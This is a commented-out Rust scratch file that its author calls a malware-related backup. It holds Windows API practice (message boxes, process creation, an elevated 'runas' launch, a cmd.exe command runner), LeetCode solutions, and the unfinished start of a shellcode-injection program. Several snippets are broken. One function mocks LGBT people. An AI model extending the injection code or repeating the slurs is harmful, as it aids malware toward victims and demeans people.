// These are my old codes and i still use these files !
// I cant just copy paste since i code on multiple systems and laptops .... 
// Thats why im keeping an backup here ! 
// All commented codes are malware related ! ... please viist https://github.com/Whitecat18/Rust-for-Malware-Development for completed codes !!
// use winapi::um::errhandlingapi::GetLastError;
// use winapi::um::winnls::GetGeoInfoA;

// fn main() {
//     let mut geo_data = vec![0u8; 10];

//     let result = unsafe {
//         GetGeoInfoA(
//             2,
//             6,
//             geo_data.as_mut_ptr().cast(),
//             geo_data.len().try_into().unwrap(),
//             0,
//         )
//     };

//     if result == 0 {
//         let err = unsafe { GetLastError() };
//         println!("Query failed with error: {}", err);
//     } else {
//         // Cut off the excess data
//         geo_data.resize(result as usize, 0);
//         println!("GEO RESULT: {}", String::from_utf8(geo_data).unwrap());
//     }
// }


// extern crate user32;
// extern crate winapi;

// use std::ffi::CString;
// use user32::MessageBoxA; 

// use winapi::um::winuser::{MB_OK, MB_ICONEXCLAMATION };

// fn main(){
//     let text = CString::new("Testing string").unwrap();
//     let message = CString::new("From Smukx").unwrap();

//     unsafe{
//         MessageBoxA(std::ptr::null_mut(),
//         text.as_ptr(),
//         message.as_ptr(),
//         MB_OK | MB_ICONEXCLAMATION,
//     );

//     }
// }

// struct Solution;

// impl Solution {
//     pub fn count_substrings(s: String) -> Vec<char> {
//         let count = s.chars().into_iter().collect::<Vec<char>>();
//         let mut iter_count = 0;
//         for i in count{
//             if i == i
//         }
//     }
// }

// fn main(){
//     let ans = Solution::count_substrings("aaa".to_string());
//     println!("{:?}", ans);
// }

// fn main(){
//     let ans = "aaa".to_string();
//     let s = ans.as_bytes();
//     let result: i32 = (0..s.len() * 2 - 1)
//         .map(|i| (0..=i/2).rev().zip(((i + 1) /2)..s.len())
//         .take_while(|(a,b)| s[*a] == s[*b]).count() as i32)
//         .sum();

//     println!("{}",result);
// }
/*
 0 to 2 * 2 -1 | -1,1,3
    i -> -1/2
*/

// struct Solution;

// impl Solution {
//     pub fn cherry_pickup(grid: Vec<Vec<i32>>) -> i32 {
//         let (m,n) = (grid.len(), grid[0].len());
        
//         let mut dp:Vec<Vec<Vec<i32>>> = vec![vec![vec![-1;n]; n]; 2]; 
//         let mut ans = 0;

//         dp[0][0][n - 1] = grid[0][0] + grid[0][n - 1];

//         let a = -1 as i8 as usize;

//         for i in 1..m{
//             for j in 0..n{
//                 for k in j + 1..n {
//                     let mut max = -1;
//                     for x in a..=1{
//                         for y in a..=1{
//                             if j+x >= 0 && j+x < n && k+y < n{
//                                 max = max.max(dp[(1+i) % 2][j+x][k+y]);
//                             }
//                         }
//                     }
//                     if max != -1{
//                         dp[i%2][j][k] = max + grid[i][j] + grid[i][k];
//                     }
//                     ans = ans.max(dp[i%2][j][k]);
//                 } 
//             }
//         }
//         ans
//     }
// }


// fn cherry_pickups(grid: &Vec<Vec<i32>>) -> i32 {
//     let m = grid.len();
//     let n = grid[0].len();

//     let mut dp = vec![vec![vec![-1; n]; n]; 2];
//     let mut ans = 0;

//     dp[0][0][n - 1] = grid[0][0] + grid[0][n - 1];

//     for i in 1..m {
//         for j in 0..n {
//             for k in j + 1..n {
//                 let mut max = -1;
//                 for x in -1..=1 {
//                     for y in -1..=1 {
//                         if j + x >= 0 && j + x < n && k + y >= 0 && k + y < n {
//                             max = max.max(dp[(i + 1) % 2][j + x][k + y]);
//                         }
//                     }
//                 }
//                 if max != -1 {
//                     dp[i % 2][j][k] = max + grid[i][j] + grid[i][k];
//                 }
//                 ans = ans.max(dp[i % 2][j][k]);
//             }
//         }
//     }

//     ans
// }

// fn main() {
//     // Example usage:
//     let grid = vec![
//         vec![1, 0, 0, 3],
//         vec![2, 0, 0, 0],
//         vec![3, 0, 0, 0],
//         vec![4, 0, 0, 0],
//     ];

//     let result = Solution::cherry_pickup(grid);
//     println!("Maximum cherries picked: {}", result);
// }

// fn cherry_pickup(grid: Vec<Vec<i32>>) -> i32 {
//     let rows = grid.len();
//     let cols = grid[0].len();
//     let mut dp = vec![vec![vec![-1; cols]; cols]; rows];

//     dp[0][0][cols - 1] = grid[0][0] + grid[0][cols - 1];

//     for i in 1..rows {
//         for j1 in 0..cols {
//             for j2 in 0..cols {
//                 let mut max_cherries = 0;
//                 for x1 in -1..=1 {
//                     for x2 in -1..=1 {
//                         let nj1 = (j1 as i32 + x1) as usize;
//                         let nj2 = (j2 as i32 + x2) as usize;
//                         if nj1 < cols && nj2 < cols && nj1 <= nj2 {
//                             max_cherries = max_cherries.max(dp[i - 1][nj1][nj2]);
//                         }
//                     }
//                 }
//                 dp[i][j1][j2] = max_cherries + grid[i][j1];
//                 if j1 != j2 {
//                     dp[i][j1][j2] += grid[i][j2];
//                 }
//             }
//         }
//     }

//     dp[rows - 1][0][cols - 1]
// }

// fn main() {
//     let grid1 = vec![
//         vec![3, 1, 1],
//         vec![2, 5, 1],
//         vec![1, 5, 5],
//         vec![2, 1, 1],
//     ];
//     let grid2 = vec![
//         vec![1, 0, 0, 0, 0, 0, 1],
//         vec![2, 0, 0, 0, 0, 3, 0],
//         vec![2, 0, 9, 0, 0, 0, 0],
//         vec![0, 3, 0, 5, 4, 0, 0],
//         vec![1, 0, 2, 3, 0, 0, 6],
//     ];

//     println!("Example 1: {}", cherry_pickup(grid1)); // Output: 24
//     println!("Example 2: {}", cherry_pickup(grid2)); // Output: 28
// }


// struct Solution;

// impl Solution{
//     fn cherry_pickup(grid: Vec<Vec<i32>>) -> i32 {
//         let rows = grid.len();
//         let cols = grid[0].len();
//         let mut dp = vec![vec![vec![-1; cols]; cols]; rows];

//         dp[0][0][cols - 1] = grid[0][0] + grid[0][cols - 1];

//         for i in 1..rows {
//             for j1 in 0..cols {
//                 for j2 in 0..cols {
//                     let mut max_cherries = 0;
//                     for x1 in -1..=1 {
//                         for x2 in -1..=1 {
//                             let nj1 = (j1 as i32 + x1) as usize;
//                             let nj2 = (j2 as i32 + x2) as usize;
//                             if nj1 < cols && nj2 < cols {
//                                 max_cherries = max_cherries.max(dp[i - 1][nj1][nj2]);
//                             }
//                         }
//                     }
//                     dp[i][j1][j2] = max_cherries + grid[i][j1];
//                     if j1 != j2 {
//                         dp[i][j1][j2] += grid[i][j2];
//                     }
//                 }
//             }
//         }

//         let mut ans = 0;
//         for j1 in 0..cols {
//             for j2 in 0..cols {
//                 ans = ans.max(dp[rows - 1][j1][j2]);
//             }
//         }

//         ans
//     }
// }

// fn main() {
//     let grid1 = vec![
//         vec![3, 1, 1],
//         vec![2, 5, 1],
//         vec![1, 5, 5],
//         vec![2, 1, 1],
//     ];
//     let grid2 = vec![
//         vec![1, 0, 0, 0, 0, 0, 1],
//         vec![2, 0, 0, 0, 0, 3, 0],
//         vec![2, 0, 9, 0, 0, 0, 0],
//         vec![0, 3, 0, 5, 4, 0, 0],
//         vec![1, 0, 2, 3, 0, 0, 6],
//     ];
//     let ans1 = Solution::cherry_pickup(grid1);
//     let ans2 = Solution::cherry_pickup(grid2);
//     println!("{} {}",ans1,ans2);
// }

// use std::process::Command;
// // use std::thread::spawn;

// fn main() {
//     println!("Running via spawn");
//     let mut out = Command::new("ls")
//         .spawn()
//         .expect("ls command failed");
    
//     out.wait().expect("Failed to wait");
//     println!("{:?}",out);
//     println!();
//     println!("Running via output");
// }
// use std::process::Command;
// use std::env;

// fn executecmd(test: &str) -> String{
//     let temp = "/c ".to_owned();
//     let cmd = temp + test;
    
//     let cmds = cmd.split(" ").collect::<Vec<&str>>();
//     let result = Command::new("cmd.exe").args(&cmds).output().unwrap();

//     let out = String::from_utf8_lossy(result.stdout.as_slice());
//     let error = String::from_utf8_lossy(result.stderr.as_slice());

//     if out.len() > 0{
//         return out.to_string();
//     } else{
//         return error.to_string();
//     }
// }

// fn main(){
//     let argument = env::args().collect::<Vec<String>>();
//     println!("{:?}",&argument[1]);
// }

// use core::slice::SlicePattern;
// use std::process::Command;

// fn main(){
//     let output = if cfg!(target_os = "windows") {
//         Command::new("powershell.exe")
//                 .args(&["/C", "ls"])
//                 .output()
//                 .expect("failed to execute process")
//     } else {
//         Command::new("sh")
//                 .arg("-c")
//                 .arg("echo hello")
//                 .output()
//                 .expect("failed to execute process")
//     };
    
//     let hello = String::from_utf8_lossy(output.stdout.as_slice());
//     println!("{}",hello);
// }

// use core::slice::SlicePattern;


// fn main(){
//     let std = vec![1,2,3,4,5];
//     let res = &std[1..5-1-1-2];
//     println!("{:?}",res);
// }

// #![allow(unused)]

// use std::{
//     io::{BufRead, BufReader, Read,Write},
//     net::*,
// };

// fn main(){
//     let ipaddress = "127.0.0.1";
//     let port = 1270;

//     let ip = match ipaddress.parse::<Ipv4Addr>(){
//         Ok(ip) => ip,
//         Err(e) => panic!("{}",e),
//     };

//     let bindaddress = SocketAddrV4::new(ip, port);
    
//     let tcplistener = match TcpListener::bind(bindaddress){
//         Ok(send) => send,
//         Err(e) => panic!("{}",e),
//     };

//     println!(
//         "The address we are listening on {:?}",
//         tcplistener.local_addr().unwrap()
//     );

//     let (mut clientstream, clientaddress) = match tcplistener.accept(){
//         Ok(address) => {
//             println!("[+] A Client connected: {:?}", address.1);
//             address
//         }
//         Err(e) => panic!("{}",e),
//     };

//     println!("Client Address : {:?}",
//         clientstream.local_addr().expect("socket addr expected")
//     );

//     println!("Peer Client Address: {:?}",
//         clientstream.peer_addr().unwrap()
//     );

//     let mut clientreader = BufReader::new(&clientstream);
//     let mut buf: Vec<u8> = vec![0;1024];
// }
// use winapi::um::{
//     memoryapi    
// }

// fn main(){
//     let a = 12;
//     let b = 
// }

// #[allow(unused_imports)]
// #[allow(unused_imports)]
// #[allow(dead_code)]



// #[allow(unused)]
// struct Reply{
//     reget: i32,
// }

// impl Reply{
//     pub fn reply(&self){
//         if self.reget == IDCANCEL{
//             println!("User gave cancel");
//         }
//         if self.reget == IDTRYAGAIN{
//             println!("Try again button");
//         }
//         else{
//             println!("User gave continue!")
//         }
//     }
// }

// use winapi::um::winuser::*;
// use winapi::um::winuser::{MB_CANCELTRYCONTINUE, MB_ICONWARNING , MB_DEFBUTTON2};

// fn main(){
//     let text = "You are Fool, learn again\0";
//     let title = "Message from Smukx\0";
    
//     // let mut count = 0;

//     let status;
//         unsafe{
//             status = MessageBoxA(std::ptr::null_mut(),
//                 text.as_bytes().as_ptr() as *const i8 ,
//                 title.as_bytes().as_ptr() as *const i8,
//                 MB_CANCELTRYCONTINUE | MB_ICONWARNING | MB_DEFBUTTON2);
//             }

//     let out = Reply{reget: status};
//     out.reply();
// }


// struct Reply;

// impl Reply{
//     pub fn output(res: i32){
//         match res{
//             IDYES => println!("Ohh i see.. Okk lets create more malware"),
//             _ => println!("Oops .. so Lets learn it"),
//         }
//     }
// }
// use winapi::um::winuser::{
//     MessageBoxW, 
//     IDYES, 
//     MB_ICONASTERISK ,
//     MB_YESNO};

// fn main(){
//     let text = "Are you a maldev\0".encode_utf16().collect::<Vec<_>>();
//     // OR you can mut these vaiables and push Null byte on these vecs !.
//     let title = "Sweety Box\0".encode_utf16().collect::<Vec<_>>();

//     let reply = unsafe {
//         MessageBoxW(
//             std::ptr::null_mut(),
//             text.as_ptr(),
//             title.as_ptr(),
//             MB_YESNO | MB_ICONASTERISK 
//         )
//     };
//     Reply::output(reply);

// }

// // #[allow(unused_unsafe)]
// use winapi::um::winuser::{MessageBeep, MessageBoxA, IDYES, MB_ICONEXCLAMATION, MB_ICONINFORMATION, MB_YESNO};
// use std::ptr::null_mut;

// fn main(){
//     let message = "Hello are you maldev\0";
//     let title = "Msg Frm Smukx\0";

//     let result: i32;

//     unsafe{
//         result = MessageBoxA(null_mut(), message.as_ptr() as *const i8, title.as_ptr() as *const i8, MB_YESNO | MB_ICONEXCLAMATION);
//     };

    
//     match result{
//         IDYES => println!("Yoo .. thats FUcking awesome ..!"),
//         _ => println!("Ohh. its okk . lets learn together"),
//     };

//     unsafe{
//         MessageBeep(MB_ICONINFORMATION);
//     }
//     // println!("ANS : {:?}",result);

// }

// use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW};
// // Using CreateProcessW
// #[allow(unused_imports)]
// use winapi::um::{
//     winbase::BELOW_NORMAL_PRIORITY_CLASS,
//     errhandlingapi::GetLastError,
//     processthreadsapi::{CreateProcessW, STARTUPINFOA},

// };
//Referrence
/* 
BOOL CreateProcessW(
    [in, optional]      LPCWSTR               lpApplicationName,
    [in, out, optional] LPWSTR                lpCommandLine,
    [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
    [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
    [in]                BOOL                  bInheritHandles,
    [in]                DWORD                 dwCreationFlags,
    [in, optional]      LPVOID                lpEnvironment,
    [in, optional]      LPCWSTR               lpCurrentDirectory,
    [in]                LPSTARTUPINFOW        lpStartupInfo,
    [out]               LPPROCESS_INFORMATION lpProcessInformation
  );
  */

//Path to Calc.exe => C:\Windows\System32\calc.exe

// use std::{mem::zeroed, ptr::null_mut};
// use winapi::shared::ntdef::FALSE;

// // use winapi::shared::minwindef::FALSE
// fn main(){
//     // STARTUPINFOA = 0 *mut as i32;
//     let path = "calc.exe";
//     // println!("{}",path);
//     unsafe{
//         let mut si = zeroed::<STARTUPINFOW>();
//         let mut pi = zeroed::<PROCESS_INFORMATION>();

//         let result = CreateProcessW(path.as_ptr() as *const u16, null_mut(), null_mut(),
//             null_mut(), FALSE.into(), BELOW_NORMAL_PRIORITY_CLASS,null_mut(), null_mut(),  , pi);

//             if !result
//             {
//                     println!("(+) Process PID is {}",pi.dwProcessId);
//             }else{
//                 println!("(-) Faild to create process, error {}",GetLastError());
//             }
//     }
// }

// use std::process::Command;

// fn main(){
//     let mut command = Command::new("calc.exe");
//     match command.spawn(){
//         Ok(mut child) => {
//             let pid = child.id();
//             println!("(-) Process ID : {}",pid);
//             match child.wait() {
//                 Ok(status) => println!("(-) Process Exited with status :[ {} ]",status),
//                 Err(err) => println!("Error at Child : {}",err),
//             }
//         }
//         Err(err) => println!("Error Spawning Child Process : {}", err)
//     }
// }


// use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW};
// // Using CreateProcessW
// #[allow(unused_imports)]
// // use winapi::um::{
// //     winbase::BELOW_NORMAL_PRIORITY_CLASS,
// //     errhandlingapi::GetLastError,
// //     processthreadsapi::{CreateProcessW, STARTUPINFOA},

// // };
// // use windows::Win32::Foundation
// use windows::Win32::{Foundation::FALSE, System::Threading::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW}};

// fn main(){
//     let mut startup_info = STARTUPINFOW::default();
//     let mut process_info = PROCESS_INFORMATION::default();

//     let path = "calc.exe";
//     let null_pointer = std::ptr::null_mut();
//     unsafe{
//         // let result = CreateProcessW(
//         //     path.as_ptr(),
//         //     std::ptr::null_mut(),
//         //     std::ptr::null_mut(),
//         //     std::ptr::null_mut(), 
//         //     FALSE,0,std::ptr::null_mut(), BELOW_NORMAL_PRIORITY_CLASS, startup_info, process_info);
//         let result = CreateProcessW(
//             path.as_ptr() as *const u16,
//             std::ptr::null_mut(), // lpApplicationName
//             std::ptr::null_mut(), // lpCommandLine
//             std::ptr::null_mut(), // lpCurrentDirectory
//             FALSE,                // bInheritHandles
//             0,                   // dwCreationFlags
//             std::ptr::null_mut(), // lpStdInput
//             std::ptr::null_mut(), // lpStdOutput
//             std::ptr::null_mut(), // lpStdError
//             &mut startup_info,
//             &mut process_info,
//         );
//     }
// }

// fn main(){
//   let vec = (1..=10).collect::<Vec<i32>>();
//   for i in 0..10{
//     print!("{} ", &vec[i]);
//   }
// }

// fn main(){
//   let test = "testing at one at";
//   println!("{}",test.to_uppercase())
// }

// fn main(){
//   // for _ in 0..10{
//   //   let handle = std::thread::spawn(||{
//   //     println!("Yea .. Running inside threads !");
//   //   });
//   //   let _ =  handle.join();
//     // let test = 10 as usize;
//     println!("{:?}",std::env::args());
//   }

// use std::env::args;

// fn main() {
//     let input = args();

//     for entry in input {
//         println!("You entered: {}", entry);
//     }
// }

// use std::env::args;

// enum Fonts{
//   Capital,
//   Lowercase,
//   Nothing,
// }

// fn main(){
//   let mut changes = Fonts::Nothing;
//   let input = args().collect::<Vec<_>>();

//   if input.len() > 2{
//     match input[1].as_str() {
//       "capital" => changes = Fonts::Capital,
//       "lower" => changes = Fonts::Lowercase,
//       _ => {}
//     }
//   }
//   for word in input.iter().skip(2){
//     match changes{
//       Fonts::Capital => println!("{}",word.to_uppercase()),
//       Fonts::Lowercase => println!("{}",word.to_lowercase()),
//       _ => println!("{}",word)
//     }
//     // println!("{}",word);
//   }
// }

// use std::ptr;
// use std::ffi::OsStr;
// use std::os::windows::ffi::OsStrExt;
// use winapi::um::winbase::{CREATE_UNICODE_ENVIRONMENT, CREATE_NEW_CONSOLE};
// use winapi::um::winnt::{LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, HANDLE, DWORD, BOOL};
// use winapi::um::processthreadsapi::{STARTUPINFOW, PROCESS_INFORMATION, CreateProcessW};
// use winapi::shared::minwindef::{LPVOID, TRUE, FALSE};

// fn main() {
//     let application_name = OsStr::new("C:\\Windows\\System32\\notepad.exe").encode_wide().collect::<Vec<u16>>();
//     let command_line = ptr::null_mut();
//     let process_attributes = ptr::null_mut();
//     let thread_attributes = ptr::null_mut();
//     let inherit_handles = FALSE;
//     let creation_flags = CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE;
//     let environment = ptr::null_mut();
//     let current_directory = ptr::null_mut();

//     let mut startup_info: STARTUPINFOW = Default::default();
//     startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as DWORD;

//     let mut process_info: PROCESS_INFORMATION = Default::default();

//     unsafe {
//         if CreateProcessW(
//             application_name.as_ptr(),
//             command_line,
//             process_attributes,
//             thread_attributes,
//             inherit_handles,
//             creation_flags,
//             environment,
//             current_directory,
//             &mut startup_info,
//             &mut process_info,
//         ) != TRUE
//         {
//             println!("(-) Failed to create process, error: {}", GetLastError());
//             return;
//         }

//         let pid = process_info.dwProcessId;
//         let h_process = process_info.hProcess;

//         println!("(+) Got handle to process");
//         println!("(+) Process started! PID: {}", pid);
//         println!("\t(+) PID: {}, Handle: 0x{:x}", pid, h_process);

//         WaitForSingleObject(h_process, INFINITE);
//         println!("(+) Finished! Exiting...");

//         CloseHandle(h_process);
//     }
// }

// // Placeholder definitions for missing WinAPI functions
// unsafe fn GetLastError() -> DWORD {
//     // Implement this function as needed
//     0
// }

// unsafe fn WaitForSingleObject(_handle: HANDLE, _milliseconds: DWORD) {
//     // Implement this function as needed
// }

// unsafe fn CloseHandle(_handle: HANDLE) {
//     // Implement this function as needed
// }

// const INFINITE: DWORD = 0xFFFFFFFF;

// #[allow(unused_imports)]
// use winapi::{shared::{minwindef::FALSE, ntdef::NULL}, um::processthreadsapi::{CreateProcessW, LPPROCESS_INFORMATION, LPSTARTUPINFOA, PROCESS_INFORMATION, STARTUPINFOA}};
// // use windows::Win32::System::Threading::STARTUPINFOW;
// use std::ptr::null_mut;

// fn main(){
//   unsafe{
//     let mut startup: STARTUPINFOA= std::mem::zeroed() ;
//     startup.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

//     let processinfo: LPPROCESS_INFORMATION = std::mem::zeroed();
//     let path = "C:\\Windows\\System32\\notepad.exe";

//     let func = CreateProcessW(path.as_ptr() as *const u16, null_mut(),null_mut() ,null_mut(),FALSE, 0, null_mut(),null_mut(),&mut startup as *mut _ as *mut _,processinfo);
    
//     println!("{}",func);
//   }
// }

// fn main(){
//   unsafe{
//     let test = std::mem::zeroed();
    
//   }

// }



// extern crate winapi;

// #[allow(unused_imports)]
// use std::{ffi::OsStr, os::windows::ffi::OsStrExt, process::exit, ptr::{self, null_mut}
// };
// use winapi::{
//   shared::minwindef::FALSE,
//   um::{
//   processthreadsapi::{PROCESS_INFORMATION,STARTUPINFOW,{CreateProcessW,GetProcessId,GetThreadId}},
//   winbase::INFINITE,
//   // handleapi::CloseHandle,
//   synchapi::WaitForSingleObject,
//   errhandlingapi::GetLastError,
// }};

// fn main(){
//   let mut path = OsStr::new("C:\\Windows\\System32\\notepad.exe").encode_wide().collect::<Vec<_>>();
//   let cmd = path.as_mut_ptr();
//   let mut startup: STARTUPINFOW = unsafe{ std::mem::zeroed()};
//   let mut process_info: PROCESS_INFORMATION = unsafe{std::mem::zeroed()};

//   unsafe{
//   /* 0s and 1s BOOL
//     BOOL CreateProcessW(
//       [in, optional]      LPCWSTR               lpApplicationName,
//       [in, out, optional] LPWSTR                lpCommandLine,
//       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
//       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
//       [in]                BOOL                  bInheritHandles,
//       [in]                DWORD                 dwCreationFlags,
//       [in, optional]      LPVOID                lpEnvironment,
//       [in, optional]      LPCWSTR               lpCurrentDirectory,
//       [in]                LPSTARTUPINFOW        lpStartupInfo,
//       [out]               LPPROCESS_INFORMATION lpProcessInformation
//     );
//   */

//     if CreateProcessW(
//       ptr::null(),
//       cmd,
//       ptr::null_mut(),
//       ptr::null_mut(),
//       FALSE,
//       0,
//       ptr::null_mut(),
//       ptr::null(),
//       &mut startup,
//       &mut process_info,
//     ) == 0{
//       println!("(-) Failed to create Process, Error: {}",GetLastError());
//       exit(1);
//     }

//     let pid = GetProcessId(process_info.hProcess);
//     let tid = GetThreadId(process_info.hThread);

//     println!("(+) got handle to process");
//     println!("(+) process started! pid: {}",pid);
//     println!("\t(+) pid:{} | handle: {:?}",pid,pid);
//     println!("\t(+) tid:{} | handle: {:?}",tid,tid);

//     WaitForSingleObject(process_info.hProcess, INFINITE);
//     println!("(+) Finish Exiting...");

    // In Rust we dont need to use the free up its allocated memory because when going out of scops rust automatically cleans up the memory due to its ownership and resource management system.
    // If you need you can clearn on yourself !...
    
    // CloseHandle(process_info.hThread); 
    // CloseHandle(process_info.hProcess);
//   }
// }


// use std::ffi::OsStr;
// use std::os::windows::ffi::OsStrExt;

// fn main(){
//   let path = OsStr::new("C:\\Windows\\System32\\notepad.exe");
//   let wide_path = path.encode_wide().collect::<Vec<_>>();
//   println!("Wide Path {:?}",wide_path);
// }

// fn prints_it(input: impl Into<String> + std::fmt::Display){
//   println!("DISPLAY : {}",input);
// }

// fn main(){
//   let print_test = "Hey, I love to play games";
//   prints_it(print_test)
// }

// fn sendback(input: &str) -> impl FnMut(i32) -> i32{
//   match input{
//     "double" => |mut number| {
//       number *= 2;
//       println!("Doubling number. Now its {}",number);
//       number
//     },
//     "triple" => |mut number| {
//       number *= 3;
//       println!("Tripling number : {}",number);
//       number
//     },
//     _ => |num|{
//       println!("Default, the num is same : {}",num);
//       num
//     },
//   }
// }


// fn main(){
//   let number = 10;
//   let mut doubles = sendback("triple");
//   doubles(number);
// }

// fn checking(input: &str) -> impl Fn(&str) -> String{
//   match input{
//     "gae" => |name: &str|{
//       println!("{} is a Gae",name);
//       name.to_string() 
//     },
//     "lesbian" => |name: &str|{
//       println!("{} is Lesbian :(",name);
//       name.to_string()
//     },
//     "nonbinary" => |name: &str|{
//       println!("{} is an Non-Binary. Please Be careful :*",name);
//       name.to_string()
//     },
//     _ => |name: &str|{
//       println!("{} is a Man",name);
//       name.to_string()
//     }
//   }

// }
// fn main(){
//   let name = "Sentiman";
//   let check_if = checking("lesbian");
//   check_if(name);
// }

// fn main(){
//   let handle = std::thread::spawn(||{
//     for _ in 0..5{
//       println!("Threading");
// }});

//   handle.join().unwrap();
//   println!("(+) Exiting");
// }



// use std::sync::{Arc,Mutex};

// fn main(){
//   let number = Arc::new(Mutex::new(0));
//   let my_number = Arc::clone(&number);
//   let my_number2 = Arc::clone(&number);

//   let thread1 = std::thread::spawn(move||{
//     for _ in 0..10{
//       *my_number.lock().unwrap() += 1;
//     }
//   });

//   let thread2 = std::thread::spawn(move ||{
//     for _ in 0..10{
//       *my_number2.lock().unwrap() += 1;
//     }
//   });

//   thread1.join().unwrap();
//   thread2.join().unwrap();
//   println!("Value is : {:?}",number);
//   println!("(+) Exiting...");
// }

// use std::io::Write;

// macro_rules! read {
//     ($out:ident as $type:ty) => {
//         std::io::stdout().flush().unwrap();
//         let mut inner = String::new();
//         std::io::stdin().read_line(&mut inner).expect("Please validate the input");
//         let $out = inner.trim().parse::<$type>().expect("Unable to convert");
//     };
// }

// fn main(){
//   let my_vec = vec![0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
//   let m_qwe = my_vec.into_iter().skip(3).take(4).collect::<Vec<i32>>();

//   println!("{:?}",m_qwe);
// }

// fn main(){
//   let vec1 = vec![1,2,3];
//   let vec1_a = vec1.iter().map(|x| x + 1).collect::<Vec<i32>>();
//   let vec1_b = vec1.into_iter().map(|x| x*10).collect::<Vec<i32>>();

//   println!("{:?}",vec1_a);
//   println!("{:?}",vec1_b);
// }

// use std::io::Write;

// macro_rules! read{
//   ($out:ident as $type:ty) => {
//     std::io::stdout().flush().unwrap();
//     let mut inner = String::new();
//     std::io::stdin().read_line(&mut inner).expect("Please validate the input");
//     let $out = inner.trim().parse::<$type>().expect("Error at validating");
//   }
// }

// struct Calculation;

// impl Calculation{
//   fn ans(n: usize,mut vec: Vec<u32>) -> Vec<u32>{
//     let mut sum = 0 as usize;
//     for i in 0..n{
//       sum += vec[i] as usize;
//     }
//     for i in 0..n{
//       vec[i] = (sum - vec[i] as usize) as u32;
//       sum = vec[i] as usize;
//     }
//     vec
//   }
// }

// fn main(){
//   let mut test: Vec<u32> = Vec::new();
//   print!("Enter the integer :");
//   read!(n as u32);

//   print!("Enter the strings: ");
//   for _ in 0..n{
//     read!(s as u32);
//     test.push(s);
//   }
//   let result = Calculation::ans(n as usize,test);
//   println!("{:?}", result);
// }

// use std::process::Command;

// fn main() {
//     let output = Command::new("calc.exe")
//         .output()
//         .expect("Failed to execute command");

//     if output.status.success() {
//         println!("Command executed successfully!");
//     } else {
//         println!("Failed to execute command: {:?}", output.status);
//         if let Some(e) = String::from_utf8(output.stderr) {
//             println!("Error message: {}", e);
//         }
//     }
// }

// extern crate winapi;
// use winapi::um::shellapi::ShellExecuteASW_SHOWNORMAL;
// use std::ptr;
// use std::ffi::CString;


// fn main(){
//   let cmd = CString::new("calc.exe").expect("Faild to locate or Fetch data");
//   let verb = CString::new("open").expect("open").expect("Failed");
//   let param = CString::new("").expect("failed");
//   let directory = CString::new("").expect("failed");
//   let showcommand = winapi::um::shellapi::SW_SHOWNORMAL;

// }

// Execute Commands! 
// extern crate winapi;

// use winapi::um::{winuser::SW_SHOWNORMAL,
//     shellapi::ShellExecuteA};
// use std::ptr;
// use std::ffi::CString;

// fn main() {
//     let command = CString::new("calc.exe").expect("CString::new failed");
//     let verb = CString::new("open").expect("CString::new failed");
//     let parameters = CString::new("").expect("CString::new failed");
//     let directory = CString::new("").expect("CString::new failed");


//     unsafe {
//         ShellExecuteA(
//             ptr::null_mut(),
//             verb.as_ptr(),
//             command.as_ptr(),
//             parameters.as_ptr(),
//             directory.as_ptr(),
//             SW_SHOWNORMAL,
//         );
//     }
// }
// struct Logic;

// impl Logic {
//     fn result(&mut self,mut input: Vec<u32>){
//         input.sort();
//         let len = input.len() as u32;
//         for i in 0..input.len(){
//             if input[i] != i as u32{
//                 println!("{}",i);
//             }else{
//                 input.push(len+1);
//             }
//         }
//     }
// }

// use std::process::exit; 

    // fn result(mut input: Vec<u32>){
    //     input.sort();
    //     let len = input.len() as u32;
    //     for i in 0..input.len(){
    //         if input[i] != i as u32{
    //             println!("{}",i);
    //             exit(1);
    //         }else{
    //             println!("{}",len+1);
    //             exit(1);
    //         }
    //     }
    // }

//     pub fn missing_number(nums: Vec<i32>) -> i32 {
//         // Since the numbers are supposed to start from 0, the length of the vector gives the expected maximum number
//         let max_expected = nums.len() as i32;
        
//         // Iterate over the expected numbers and check if they exist in the vector
//         for i in 0..=max_expected {
//             if !nums.contains(&i) {
//                 return i;
//             }
//         }
        
//         // If all numbers are present, the missing number is the next one after the maximum expected
//         max_expected + 1
//     }

// fn main(){
//     // println!("")
//     let mut nums = vec![3,0,1];
//     missing_number(nums);
//     // println!("{:?}",ans);
// }

// // fn main() {
// //     let mut v = vec![0, 10, 5, 15, 25, 1, -10, 10, 50000];
// //     println!("The Vector before sorting = {:?}", v);
// //     v.sort();
// //     println!("The vector sorted in asc order  = {:?}", v);
// //     v.reverse();
// //     println!("The vector sorted in desc order = {:?}", v);
// // }


// extern crate winapi;

// use winapi::um::{winuser::SW_SHOWNORMAL,
//     shellapi::ShellExecuteA};
// use std::ptr::null_mut;
// use std::ffi::CString;

// fn main() {
//     //API DOCUMENT LINK : https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea

//     let cmd = CString::new("pwsh.exe").unwrap();
//     let opr = CString::new("runas").unwrap();

//     unsafe {
//         ShellExecuteA(
//             null_mut(),
//             opr.as_ptr(),
//             cmd.as_ptr(),
//             null_mut(),
//             null_mut(),
//             SW_SHOWNORMAL,
//         );
//     }
// }

// Shellcodes Execution !! [[ CROW'S c++ prog]]

// use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READWRITE};
// // use winapi::{shared::ntdef, um::memoryapi::VirtualAlloc};
// #[allow(unused_import_braces)]
// #[allow(unused_imports)]

// use winapi::{
//     shared::ntdef::NULL,
//     um::{
//     memoryapi::VirtualAllocEx,
//     winnt::{THREAD_ALL_ACCESS,PROCESS_ALL_ACCESS},
//     processthreadsapi::{OpenProcess,GetProcessId,GetThreadId},
//     errhandlingapi::GetLastError,
// }};

// use std::env::args;
// use std::process::exit;

// fn main(){
//     let input: Vec<_> = args().collect();

//     if input.len() < 2{
//         println!("(+) USAGE: program.exe PID");
//         exit(1);
//     }
